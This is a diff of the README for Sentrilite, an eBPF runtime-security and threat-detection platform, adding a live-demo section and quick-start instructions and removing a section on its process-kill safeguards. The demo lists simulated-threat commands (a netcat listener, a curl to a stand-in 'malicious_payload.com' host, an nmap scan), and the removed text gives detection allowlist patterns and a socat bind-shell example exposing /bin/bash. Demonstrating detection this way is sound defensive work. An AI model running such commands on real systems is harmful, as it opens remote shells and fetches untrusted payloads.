@@ -1,18 +1,48 @@
-# Sentrilite — Threat-Detection-as-Code, eBPF-based, Observability, Runtime-Security & Cloud-Security Posture Management in One Platform with AI/LLM Insights.
+# Sentrilite — Threat Detection-as-Code & Active Response (DACR), eBPF-based, Observability, Runtime-Security & Cloud-Security Posture Management in One Platform with AI/LLM Insights.
+## Website: https://sentrilite.com
+## Contact: info@sentrilite.com
 
-#Sentrilite Workflow Diagram
-![Sentrilite hybrid cloud diagram](./Sentrilite_Architecture_Diagram.png)
-#Sentrilite Components
-![Sentrilite components](./components.png)
+# Live Demo – Active Threat Response
+![Sentrilite Demo](./Sentrilite_Demo.gif)
+
+---
+
+## What This Demo Shows
+
+- Detection of active threats **during execution**
+- Risk scoring based on **syscall + process + network behavior**
+- **Automatic process termination** for high-risk activity
+
+This demo shows **real-time detection and automatic termination of malicious activity** on a live Linux system using Sentrilite.
+
+| Color | Category | Meaning |
+|------|---------|--------|
+| 🔴 **Red** | Critical Risk | Confirmed malicious behavior with high confidence |
+| 🟠 **Orange** | Medium Risk | Suspicious activity requiring investigation |
+| 🟣 **Purple** | Active Response | Enforcement action taken – process terminated |
+
+The following commands were used for simulation:
+```
+sudo  nc -l 5000
+curl http://malicious_payload.com >/dev/null 2>&1
+nmap -p 22,80,443 127.0.0.1 >/dev/null 2>&1
+```
+---
+
+# Sentrilite Alert Report
+![Sentrilite PDF_Report](./Sample_Alert_Report.png)
 # Main Dashboard
 ![Sentrilite Main Dashboard](./main_dashboard.png)
 # Live Server Dashboard
 ![Sentrilite Server_Dashboard](./live_dashboard.png)
-# PDF Report
-![Sentrilite PDF_Report](./pdf_report.png)
+# Sentrilite Workflow Diagram
+![Sentrilite hybrid cloud diagram](./Sentrilite_Architecture_Diagram.png)
+# Sentrilite Components
+![Sentrilite components](./components.png)
 # CI/CD Workflow
 ![Sentrilite_CI_CD_Workflow](./CI_CD_Workflow.png)
 
+# ✨ Description
 
 Sentrilite is a Detection-as-Code (DAC), Hybrid-Cloud Programmable Observability, Runtime-Security & CSPM Platform and streams structured, real-time events to a web UI where custom rules drive risk scoring, alerting, and reporting.
 Hybrid & multi-cloud ready: Works the same across public clouds and on-prem—EKS, GKE, AKS, vanilla Kubernetes, bare-metal, and edge—so you get a consistent, low-overhead security and observability layer for hybrid/multi-cloud environments all managed from a single dashboard.
@@ -74,8 +104,8 @@ In summary, Sentrilite gives you container-aware process, file, and network visi
 | `LICENSE.bpftool`         | GPL-2.0 License for bpftool. Source: https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/plain/LICENSES/preferred/GPL-2.0
 | `license.key`             | Sentrilite License key file
 | `LICENSE.txt`             | Sentrilite License Agreement
-| `install.README`          | This installation guide
 | `gen_keys.txt`            | Instructions to create tls/ssl/jwt keys for agent/control-plane
+| `install.README`          | This installation guide
 | `dashboard.README`        | Dashboard usage guide
 | `Product Guide v1.1.pdf`  | Sentrilite Product Guide
 
@@ -111,6 +141,32 @@ The project is currently using a trial license.key .
 
 Sentrilite prefers env vars (K8s) and falls back to sys.conf (bare metal).
 Note: Alertmanager must be reachable and supports v2 API (/api/v2/alerts). PagerDuty uses Events v2.
+
+---
+
+## Quick Trial 
+
+## Run it with Docker 
+
+```
+sudo docker run \
+  --name sentrilite \
+  --privileged \
+  --network host \
+  -v /sys/fs/bpf:/sys/fs/bpf \
+  -v /sys/kernel/debug:/sys/kernel/debug \
+  sentrilite/local:1.0.0
+
+```
+PDF reports can be downloaded at http://localhost:8080. Reports are generated every 5 mins.
+
+## Run it on Kubernetes Cluster
+
+git clone repo. cd to the charts directory and run:
+
+```
+helm upgrade --install sentrilite charts/sentrilite -n kube-system --create-namespace
+```
 
 ---
 
@@ -221,7 +277,7 @@ For more detail information, refer to dashboard.README
 
 - license.key — place in the current directory (baked in image or mounted as Secret).
 - sys.conf — network config, placed in the current directory (baked in image or mounted as ConfigMap).
-- Rule files (custom_rules.json, sensitive_files.json, security_rules.json, regex_rules.json) reside in the working dir; rules can be managed via the dashboard.
+- Rule files (custom_rules.json, sensitive_files.json, security_rules.json, alerts.json) reside in the working dir; rules can be managed via the dashboard.
 
 ---
 
@@ -229,69 +285,6 @@ For more detail information, refer to dashboard.README
 
 - Events include (when available): k8s_namespace, k8s_pod, k8s_container, k8s_pod_uid.
 - OOMKilled alerts and pod watchers run best-effort when the agent can access K8s APIs.
-
----
-
-# Active Threat Response — Behavior & Safety Guarantees
-
-This document explains **exactly what `guardedKillWithTimeout()` will kill, what it will refuse to kill, and why**.  
-The goal of this function is to enable **safe, auditable active response** without risking system or infrastructure stability.
-
----
-
-## High-Level Summary
-
-Sentrilite Active Threat Response: attempts to terminate a process **only if it passes strict guardrails**.
-
-The function:
-1. Applies **hard safety checks** (PID, `/proc`, protected processes)
-2. Applies **root-specific restrictions**
-3. Attempts a **two-phase kill** (`SIGTERM` → `SIGKILL`)
-4. Returns a **deterministic outcome string + success flag**
-
-It is **safe-by-default** and intentionally conservative.
-
-## What It Will Kill
-
-To enable it, make the risk_level/severity to 0.
-
-### 1. Non-root user processes
-Processes are killable if ALL of the following are true:
-
-- `pid > 2`
-- `/proc/<pid>/status` is readable
-- Process is **not protected** by `isProtectedProcess()`
-
-Kill sequence:
-1. Send `SIGTERM`
-2. Wait up to `timeout / 2`
-3. If still alive, send `SIGKILL`
-4. Wait remaining timeout
-5. Report success if the process exits
-
-This includes:
-- Normal user processes (`uid >= 1000`)
-- User-launched background processes
-- Many application processes running in containers (unless infra-protected)
-
-### 2. Root processes — **only if interactive and allowlisted**
-
-Root (`uid == 0`) processes are killable **only if** they appear to be:
-- Interactive (attached to a TTY)
-- Launched from `sudo`, `su`, or a shell (`bash`, `sh`, `zsh`, `fish`)
-- Match an explicit **risky command allowlist**
-
-Current allowlist patterns:
-- `nc -l`, `ncat -l`, `netcat -l`
-- `socat`
-- `bash -i`, `sh -i`
-
-Example (killable):
-```
-sudo nc -l 5000
-sudo socat TCP-LISTEN:4444,fork EXEC:/bin/bash
-sudo bash -i
-```
 
 ---
 
